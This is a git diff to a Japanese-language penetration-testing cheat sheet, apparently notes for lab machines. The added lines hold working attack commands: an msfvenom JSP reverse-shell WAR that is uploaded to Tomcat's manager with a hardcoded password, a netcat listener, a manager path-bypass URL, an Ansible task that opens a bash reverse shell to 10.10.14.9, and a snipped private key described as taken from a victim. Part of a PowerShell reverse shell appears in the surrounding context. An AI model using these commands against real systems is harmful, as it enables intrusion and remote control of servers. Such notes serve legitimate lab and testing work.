@@ -129,6 +129,17 @@ chmod 600 id_rsa
 - -b...ビット数の固定(-t rsa -b 4096など)
 - -f...ファイル名(id_????の?部分)
 
+victimからid_rsaを取得してコピーした際には、最後に改行を入れておく。
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+YG6tmwVeTbhkycXMbEVeIsG0a42Yj1ywrq5GyXKYaFr3DnDITcqLbdxIIEdH1vrRjYynVM
+---snip---
+ueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ
+u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
+-----END OPENSSH PRIVATE KEY-----ここに改行
+```
+
 ### 公開鍵認証方式でsshログイン
 ```
 cat id_rsa.pub >> ~/.ssh/authorized_keys
@@ -660,21 +671,15 @@ Response.write("</pre><!-"&"-") %>
 ```
 
 ### Tomcat
-#### RCE
 ```
 /usr/share/tomcat9/etc/tomcat-users.xml
 ```
-<<<<<<< HEAD
 #### RCE
-=======
->>>>>>> 3855e09c5ef05d4c4b9e90efb8b5ed25b8b76b71
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f war -o shell.war
-curl --user 'tomcat':'$3cureP4s5w0rd123!' --upload-file shell.war "http://10.10.10.1:8080/manager/text/deploy?path=/shell"
-<<<<<<< HEAD
 
-=======
->>>>>>> 3855e09c5ef05d4c4b9e90efb8b5ed25b8b76b71
+curl --user 'tomcat':'$3cureP4s5w0rd123!' --upload-file shell.war "http://10.10.10.1:8080/manager/text/deploy?path=/shell"
+
 nc -lvnp 443
 curl --user 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.1:8080/shell/
 ```
@@ -701,7 +706,7 @@ with open('tomcat-betterdefaultpasslist.txt') as f:
 #### Tomcat + リバースプロキシ(Apache,Nginx,IIS)
 ```
 http://example.com/manager/html
-http://example.com/manager;name=aaaa/html
+http://example.com/manager/;/html
 ```
 
 ### ShellShock(CVE-2014-6271)
@@ -1517,6 +1522,14 @@ ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-Str
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
 ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
 lient.Close()"
+```
+
+### Ansible
+```
+- hosts: localhost
+  tasks:
+  - name: rev
+    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'
 ```
 
 ## ^msfvenom
